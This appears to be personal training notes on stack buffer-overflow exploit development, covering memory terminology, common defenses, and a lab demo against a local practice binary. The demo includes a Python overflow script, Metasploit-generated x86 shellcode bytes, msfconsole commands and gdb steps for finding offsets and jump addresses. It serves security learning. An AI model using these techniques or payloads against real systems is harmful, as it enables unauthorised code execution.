============================================================
Exploit Development
============================================================
------------------------------------------------------------
Common Terms
------------------------------------------------------------
HEAP - Memory that can be allocated and deallocated
STACK - A contiguous section of memory used for passing arguments
REGISTERS - Storage elemts as close as possible to the central processing unit (CPU)
INSTRUCTION POINTER - a.k.a Program Counter (PC), contians the address of next instruction to be executed
STACK POINTER - Contains the address of the next available space on the stack
BASE POINTER - The base of the stack
FUNCTION - Code that is separate from the main program that is often used to replace code that repeats in order to imporve the size and efficiency of code.
SHELLCODE - The code that is executed once an exploit successfully takes advantage of a vulnerability

------------------------------------------------------------
Defenses
------------------------------------------------------------
- Non executable (NX) stack
- Address Space Layout Randomization (ASLR)
- Data Execution Prevention (DEP)
- Stack Canaries
	Secret value placed on stack that changes when stack is started.
- Position Independent Executable (PIE)

Useing GBD, GBD PEDA

============================================================
DEMO
============================================================
gdb ./func
	run
		Overflow input

wiremask.eu

<<< - Redirects output of script to user input of command.
	Used only if the program has user input. NOT if it wokrs with parameters liek cat.
	
vim buffover.py
	#!/usr/bin/python
	
	#Buffer
	bufer = "A"*62
	
	#eip
	eip = "B"*4
	
	#nop operation
	nop = "\x90"*10
	
	#Shellcode
	buf =  b""
	buf += b"\xbe\xff\xbc\x2c\x41\xdb\xc7\xd9\x74\x24\xf4\x5a"
	buf += b"\x2b\xc9\xb1\x0b\x83\xea\xfc\x31\x72\x10\x03\x72"
	buf += b"\x10\x1d\x49\x46\x4a\xb9\x2b\xc5\x2a\x51\x61\x89"
	buf += b"\x3b\x46\x11\x62\x4f\xe0\xe2\x14\x80\x92\x8b\x8a"
	buf += b"\x57\xb1\x1e\xbb\x6f\x35\x9f\x3b\x07\x5d\xf0\x5a"
	buf += b"\x8a\xf4\x0e\xca\x07\x8f\xee\x39\x27"
 
 	print(bufer + eip + nop)

gdb ./func
	run <<< $(python buffover.py)
	
msfconsole
	use payload/linux/x86/exec
	show options
	set CMD whoami
	generate -b "\x00" -f python
		copy 
		buf =  b""
		buf += b"\xbe\xff\xbc\x2c\x41\xdb\xc7\xd9\x74\x24\xf4\x5a"
		buf += b"\x2b\xc9\xb1\x0b\x83\xea\xfc\x31\x72\x10\x03\x72"
		buf += b"\x10\x1d\x49\x46\x4a\xb9\x2b\xc5\x2a\x51\x61\x89"
		buf += b"\x3b\x46\x11\x62\x4f\xe0\xe2\x14\x80\x92\x8b\x8a"
		buf += b"\x57\xb1\x1e\xbb\x6f\x35\x9f\x3b\x07\x5d\xf0\x5a"
		buf += b"\x8a\xf4\x0e\xca\x07\x8f\xee\x39\x27"
		
lin ops 
env - gdb func
	show env
		unset env LINES
		unset env COLUMNS
	run
		Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
	info proc map
		copy first start address after heap
		copy last end address
	find /b <First address>, <Last address>, 0xff, 0x34

============================================================

============================================================
	
